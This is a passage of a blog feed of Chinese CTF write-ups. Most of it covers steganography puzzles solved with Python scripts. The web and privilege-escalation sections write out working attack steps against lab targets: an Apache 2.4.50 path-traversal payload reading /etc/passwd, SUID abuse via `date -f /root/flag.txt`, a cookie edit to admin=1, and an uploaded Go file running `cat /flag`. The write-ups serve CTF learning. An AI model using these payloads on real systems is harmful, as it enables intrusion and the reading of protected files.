96973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058</span><br><span class="line">aa = Tupper_self_referential_formula(k)</span><br><span class="line">plt.figure(figsize=(15,10))</span><br><span class="line">plt.imshow(aa,origin=&#x27;lower&#x27;)</span><br><span class="line">plt.savefig(&quot;tupper.png&quot;)</span><br><span class="line">img = Image.open(&#x27;flag.png&#x27;)</span><br></pre></td></tr></table></figure><p>这里得到下图（直接得到的图片是翻转的需要旋转180度）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f05fbd756.png" alt="tupper.png">得到33，121，144三个值</p><p>更具经验猜测这里用了猫脸变换(arnold变换)</p><p>使用网上脚本进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"> </span><br><span class="line">img = Image.open(&#x27;flag.png&#x27;)</span><br><span class="line">if img.mode == &quot;P&quot;:</span><br><span class="line">    img = img.convert(&quot;RGB&quot;)</span><br><span class="line">assert img.size[0] == img.size[1]</span><br><span class="line">dim = width, height = img.size</span><br><span class="line"> </span><br><span class="line">st = 33</span><br><span class="line">a = 121</span><br><span class="line">b = 144</span><br><span class="line">for _ in range(st):</span><br><span class="line">    with Image.new(img.mode, dim) as canvas:</span><br><span class="line">        for nx in range(img.size[0]):</span><br><span class="line">            for ny in range(img.size[0]):</span><br><span class="line">                y = (ny - nx * a) % width</span><br><span class="line">                x = (nx - y * b) % height</span><br><span class="line">                canvas.putpixel((y, x), img.getpixel((ny, nx)))</span><br><span class="line">canvas.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f12eb8083da.jpg" alt="QQ截图20220808234133.jpg"></p><h2 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h2><p>下载附件发现很多txt文件随便点开一个是一串二进制，和下一个文档位置</p><p>点击发现每个里面都有一串二进制且最长的为16进制，看大佬wp知道这里需要进行补位</p><p>同时发现有start.txt</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275efe10a7.jpg" alt="QQ截图20220809225532.jpg"></p><p>这里思路是从头到尾获取二进制然后整合转hex编码获取隐藏内容</p><p>网上寻找脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from binascii import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tmp_filename = &#x27;start.txt&#x27;</span><br><span class="line">bin_data = &#x27;&#x27;</span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">file_path = &#x27;./BinDunDun/&#x27; + tmp_filename</span><br><span class="line">with open(file_path) as f:</span><br><span class="line">content = f.read()</span><br><span class="line">next_file = re.findall(r&#x27;\w&#123;10&#125;\.txt&#x27;, content)</span><br><span class="line">if next_file != []:</span><br><span class="line">tmp_filename = next_file[0] </span><br><span class="line">bin_data += content[:content.find(&#x27; &#x27;)].zfill(16)</span><br><span class="line">else:</span><br><span class="line">print(file_path)</span><br><span class="line">break</span><br><span class="line">except:</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">hex_data = &#x27;&#x27;</span><br><span class="line">with open(&#x27;BinDunDun.zip&#x27;, &#x27;wb&#x27;) as f1:</span><br><span class="line">for i in range(0, len(bin_data), 8):</span><br><span class="line">hex_data += &#x27;&#123;:02x&#125;&#x27;.format(int(bin_data[i:i+8], 2))</span><br><span class="line">f1.write(unhexlify(hex_data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获得压缩包解压获得一个pyc文件和一个受损文件</p><p>pyc是py文件编译后文件尝试pyc反编译查看有无线索</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275e2e8bf9.jpg" alt="QQ截图20220809224531.jpg"></p><p>发现没什么线索在根据pyc尝试pyc隐写（使用剑龙）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275cb6fb4b.jpg" alt="QQ截图20220809224653.jpg"></p><p>获得一串字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BingD@nD@n_in_BeiJing_Winter_Olympics</span><br></pre></td></tr></table></figure><p>然后习惯性使用010打开无后缀名文件发现JFIF猜测这里是一个JPG文件修改后缀和文件头</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275ba0c862.jpg" alt="QQ截图20220809225036.jpg"></p><p>发现是一个冰墩墩照片尝试隐写（菜鸟只想到了binwalk发现没有）</p><p>看大佬这里有一串之前密码所以想到了JPHS5</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275ae9b7dd.jpg" alt="QQ截图20220809225545.jpg"></p><p>解密获得一串base64解密得到flag</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f275a20f599.jpg" alt="QQ截图20220809225612.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;SimpleFlow&quot;&gt;&lt;a href=&quot;#SimpleFlow&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>出题人挑战赛</title>
    <link href="http://just-aleaf.github.io/2022/08/02/%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/02/%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-08-02T12:28:43.000Z</published>
    <updated>2022-08-09T15:16:03.083Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-不懂PCB的厨师不是好黑客"><a href="#1-不懂PCB的厨师不是好黑客" class="headerlink" title="(1)不懂PCB的厨师不是好黑客"></a>(1)不懂PCB的厨师不是好黑客</h3><p>我们这里下载附件解压发现有题目中的PCB文件夹010打开</p><p>然后很简单的crtl+f搜索就可以找到flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9194bf3cd7.jpg" alt="QQ截图20220802203159.jpg"></p><h3 id="2-卡比"><a href="#2-卡比" class="headerlink" title="(2)卡比"></a>(2)卡比</h3><p>知识点:卡比文字，维吉尼亚解密</p><p>出题人得多喜欢卡比，确实没想到对应游戏里面的语言，哈哈哈哈哈</p><p>上网搜索卡比语言（即使知道是什么也是找了好久）</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91b13d04d4.jpg" alt="QQ截图20220802203938.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91b31069a9.jpg" alt="QQ截图20220802204008.jpg"></p><p>将给定附件对应翻译即可得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTRH&#123;GWDVSWVQBFISZSZ&#125;</span><br></pre></td></tr></table></figure><p>然后这里直接提交发现错误，然后无脑尝试base64发现也不对</p><p>然后又想到维吉尼亚密码（加密后也全为英文）</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p><p>但是这种解密需要密钥</p><p>找遍全部也只有kirby尝试一波发现成功</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e91bcc89f81.jpg" alt="QQ截图20220802204243.jpg"></p><h3 id="3-rootme"><a href="#3-rootme" class="headerlink" title="(3)rootme"></a>(3)rootme</h3><p>知识点:SUID提权</p><p>开启靶机然后使用xshell进行连接</p><p>连接之后尝试管理员权限发现并不可行尝试提权</p><p>提权之前就要先了解一下SUID提权</p><h4 id="SUID提权（LINUX）"><a href="#SUID提权（LINUX）" class="headerlink" title="SUID提权（LINUX）"></a>SUID提权（LINUX）</h4><p>A.什么是SUID</p><p>首先我们要先了解什么是SUID，</p><p>SUID是LINUX中的一种特殊类型权限（只作用于二进制可执行文件），当用户在运行一个程序的时候，如果这个程序有SUID权限，那么该程序运行进程的属主就不是发起者，而是文件所属的属主（通俗来说就是当我们以普通用户去运行属主为root且设置了SUID权限的进程时我们可以以root权限去运行该进程达到提权）</p><p>B.设置SUID权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s 文件名   //设置SUID</span><br><span class="line">chmod u-s 文件名   //去除SUID</span><br></pre></td></tr></table></figure><p>可以通过ls -al查看文件的权限</p><p>当我们通过chmod设置权限之后我们可以观察到x变为了s，代表设置成功</p><p>C. 提权思路</p><p>运行root用户所拥有的SUID文件，当其他用户运行该文件的时候就会获取root身份</p><p>这里就需要知道可以进行提权的root设置的SUID权限的二进制可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap </span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure><p>D.探测具有SUID权限的二进制可执行文件</p><p>运用于不同系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null/</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb&#123;&#125;</span><br></pre></td></tr></table></figure><p>这里以第一条为例进行详细解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null/</span><br><span class="line">-u=s:查找root用户拥有的文件</span><br><span class="line">-type:设置正在寻找的文件类型</span><br><span class="line">f:常规文件</span><br><span class="line">2&gt;/dell/null/:默认&gt;/dev/null为1时为标准输出，为2时会将错误输出到垃圾桶中，通俗点就是不会显示错误</span><br><span class="line">整句的意思就是从/目录种查找属主为root同时具备SUID权限的二进制文件并回显，如果有错误就将其输出到dev/null（垃圾桶）</span><br></pre></td></tr></table></figure><p>E.防范措施</p><p>减少对二进制可执行文件赋予SUID权限</p><p>回归题目</p><p>这里我们就需要用到SUID进行提权</p><p>首先查找具有SUID权限属主为root的二进制可执行文件</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e931c24e544.jpg" alt="QQ截图20220802221624.jpg"></p><p><a href="https://gtfobins.github.io/">GTFOBins</a></p><p>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全。介绍了当你有某些二进制文件可用是，如何过去root权限</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e9414c1f6e0.jpg" alt="QQ截图20220802232234.jpg"></p><p>通过题中提示可以看到flag位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -f /root/flag.txt</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e942d799ad1.jpg" alt="QQ截图20220802232909.jpg"></p><h3 id="4-神必流量"><a href="#4-神必流量" class="headerlink" title="(4)神必流量"></a>(4)神必流量</h3><p>下载附件发现是一个流量包</p><p>binwalk查看是否有什么隐藏文件</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94aa7959f4.jpg" alt="QQ截图20220802235051.jpg"></p><p>发现有一个7z文件进行提取</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94aa80a618.jpg" alt="QQ截图20220803000216.jpg"></p><p>提取后访问发现需要密码尝试发现并不是伪加密那就乖乖去找密码</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94afe4c8d5.jpg" alt="QQ截图20220803000400.jpg"></p><p>只有流量包了尝试找到对应流量分析发现有个123456尝试输入</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e94bb638735.jpg" alt="QQ截图20220803000705.jpg"></p><p>解密成功给了一个地址</p><p><a href="https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view">https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view</a></p><h3 id="4-噪音"><a href="#4-噪音" class="headerlink" title="(4)噪音"></a>(4)噪音</h3><h3 id="5-delflag"><a href="#5-delflag" class="headerlink" title="(5)delflag"></a>(5)delflag</h3><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Power-Cookie"><a href="#1-Power-Cookie" class="headerlink" title="(1)Power Cookie"></a>(1)Power Cookie</h3><p>知识点：cookie修改</p><p>启动靶机访问抓包发现发送之后Set-cookie中有admin&#x3D;0值</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e2b9279a1.jpg" alt="QQ截图20220803105018.jpg"></p><p>尝试修改cookie为admin&#x3D;1得到flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e2b81b100.jpg" alt="QQ截图20220803105106.jpg"></p><h3 id="2-魔法浏览器"><a href="#2-魔法浏览器" class="headerlink" title="(2)魔法浏览器"></a>(2)魔法浏览器</h3><p>知识点:UA修改，js解密</p><p>启动靶场发现需要使用魔法浏览器进行访问</p><p>f12查看源代码发现给了一串关于ua修改的js</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e473a9429.jpg" alt="QQ截图20220803105811.jpg"></p><p>尝试运行</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e8fa733cc.jpg" alt="QQ截图20220803111807.jpg"></p><p>得到uaburp抓包修改获取flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e473e4a9d.jpg" alt="QQ截图20220803105839.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9e4742ba21.jpg" alt="QQ截图20220803105847.jpg"></p><h3 id="3-getme"><a href="#3-getme" class="headerlink" title="(3)getme"></a>(3)getme</h3><p>知识点:apache2.4.50目录穿透</p><p>启动靶场发现</p><p>测试发现时apache2.4.50,该版本具有目录穿越的漏洞</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed00d4b1b.jpg" alt="QQ截图20220803112318.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br></pre></td></tr></table></figure><p>测试发现确实存在漏洞</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed0f92239.jpg" alt="QQ截图20220803112847.jpg"></p><p>访问日志查看是否有flag的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%32%65/logs/access_log</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed155a87f.jpg" alt="QQ截图20220803113003.jpg"></p><p>找到flag相关信息一个一个进行访问发现前面的都显示400当最后一个的时候回显flag</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/03/62e9ed101486e.jpg" alt="QQ截图20220803113148.jpg"></p><h3 id="4-hackme"><a href="#4-hackme" class="headerlink" title="(4)hackme"></a>(4)hackme</h3><p>知识点:go语言</p><p>开启靶场</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec955f44e17.jpg" alt="QQ截图20220805114621.jpg"></p><p>第一眼看到也没什么想法随便点点看</p><p>process:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97db40905.jpg" alt="QQ截图20220805120845.jpg"></p><p>log:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97eb6b4ad.jpg" alt="QQ截图20220805120907.jpg"></p><p>whoami:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec97f93a58a.jpg" alt="QQ截图20220805120920.jpg"></p><p>whereami</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec98094deb3.jpg" alt="QQ截图20220805120937.jpg"></p><p>users:</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec9817ccf9a.jpg" alt="QQ截图20220805120952.jpg"></p><p>发现类似于每一个页面里面是一种命令执行</p><p>users显示没有找到users.go这个文件，又发现有一个.go文件的上传点，所以猜测这里是上传一个.go的文件然后点击后会对应寻找.go文件进行命令执行</p><p>这里上网寻找一个cat&#x2F;flag的go语言脚本（go语言完全没有接触过），然后以flag.go上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"> </span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">    Command(&quot;cat /flag&quot;)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func Command(cmd string) error &#123;</span><br><span class="line">c := exec.Command(&quot;bash&quot;, &quot;-c&quot;, cmd)</span><br><span class="line">output, err := c.CombinedOutput()</span><br><span class="line">fmt.Println(string(output))</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/05/62ec974fdc397.jpg" alt="QQ截图20220805120632.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;1-不懂PCB的厨师不是好黑客&quot;&gt;&lt;a href=&quot;#1-不懂PCB的厨师不是好黑客&quot; class=&quot;header</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="http://just-aleaf.github.io/2022/08/01/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/01/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-07-31T17:06:01.000Z</published>
    <updated>2022-08-09T15:20:24.393Z</updated>
    
    <content type="html"><![CDATA[<h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="1-OCR"><a href="#1-OCR" class="headerlink" title="(1)OCR"></a>(1)OCR</h3><p>下载发现是一个凌乱的图片<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878f02a0f.jpg" alt="QQ截图20220802100141.jpg"><br>尝试使用010 Editor（这里为什么使用该编译器，因为改编译器会提示CRC错误)</p><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878f530ba.jpg" alt="QQ截图20220802100150.jpg"></p><p>这里发现CRC报错说明宽或高方面有问题<br>上网找一个脚本进行宽高的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line"> </span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">import  binascii</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">file = &#x27;flag_pic (2).png&#x27;//只需要将这里的file名改为对应文件名即可</span><br><span class="line"> </span><br><span class="line">fr = open(file,&#x27;rb&#x27;).read()</span><br><span class="line"> </span><br><span class="line">data = bytearray(fr[12:29])</span><br><span class="line"> </span><br><span class="line">crc32key = struct.unpack(&#x27;&gt;I&#x27;,fr[29:33])[0]&amp;0xffffffff</span><br><span class="line"> </span><br><span class="line">print(crc32key)</span><br><span class="line"> </span><br><span class="line">n = 4096</span><br><span class="line"> </span><br><span class="line">for w in range(n):</span><br><span class="line"> </span><br><span class="line">    width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))</span><br><span class="line"> </span><br><span class="line">    for h in range(n):</span><br><span class="line"> </span><br><span class="line">        height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))</span><br><span class="line"> </span><br><span class="line">        for x in range(4):</span><br><span class="line"> </span><br><span class="line">            data[x+4] = width[x]</span><br><span class="line"> </span><br><span class="line">            data[x+8] = height[x]</span><br><span class="line"> </span><br><span class="line">            #print(data)</span><br><span class="line"> </span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line"> </span><br><span class="line">        if crc32result == crc32key:</span><br><span class="line"> </span><br><span class="line">            print(crc32key)</span><br><span class="line"> </span><br><span class="line">            print(width,height)</span><br><span class="line"> </span><br><span class="line">            print(data)</span><br><span class="line"> </span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line"> </span><br><span class="line">            for x in range(4):</span><br><span class="line"> </span><br><span class="line">                newpic[x+16] = width[x]</span><br><span class="line"> </span><br><span class="line">                newpic[x+20] = height[x]</span><br><span class="line"> </span><br><span class="line">            fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;)</span><br><span class="line"> </span><br><span class="line">            fw.write(newpic)</span><br><span class="line"> </span><br><span class="line">            fw.close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8878ff2719.jpg" alt="QQ截图20220802100156.jpg"><br>运行得到正常文件<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893b9ad5a8.jpg" alt="QQ截图20220802100203.jpg"><br>这里获得的是一个图片这里就呼应了题目用到了OCR<br><a href="https://uutool.cn/ocr/">https://uutool.cn/ocr/</a><br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8939f64954.jpg" alt="QQ截图20220802100210.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377 ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">94A676D2FDE351A055C168F9710364AE2D581126E378F3B4C47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99C853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0COCEFOCAOB68COCCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFCOFEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074C27F81C719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3 DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56C403C583983F5527A0D6C5D6928481D56955474046D9FC17A2DE21F3D6FC4C69644E7C6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>发现对应的十六进制我们将其放入编辑器<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893d3f274d.jpg" alt="QQ截图20220802100219.jpg"><br>发现是zip文件<br>解压即可得到一个txt文件<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893e2530ff.jpg" alt="QQ截图20220802100225.jpg"><br>发现中间base64加密密文解密即可获得flag<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e893fea5c30.jpg" alt="QQ截图20220802100231.jpg"></p><h3 id="2-The-correct-flag"><a href="#2-The-correct-flag" class="headerlink" title="(2)The correct flag"></a>(2)The correct flag</h3><p>下载附件发现有好多看不到的数据尝试复制粘贴到记事本发现出现数据<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941e99fdd.jpg" alt="QQ截图20220802100237.jpg"><br>然后就是词汇分析表示摆烂没搞懂</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-Pngenius"><a href="#1-Pngenius" class="headerlink" title="(1)Pngenius"></a>(1)Pngenius</h3><p>下载附件是一张照片<br>一张照片还是misc不管三七二十一先zsteg看看有没有隐写内容<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941eda02a.jpg" alt="QQ截图20220802100244.jpg"><br>发现一个zip密码说明内藏了一个zip文件<br>所以就在使用binwalk分离一波<br><img src="http://wp.xiaohuang.vip/p/0/2022/08/02/62e8941f31424.jpg" alt="QQ截图20220802100308.jpg"><br>反手分离出来<br><img 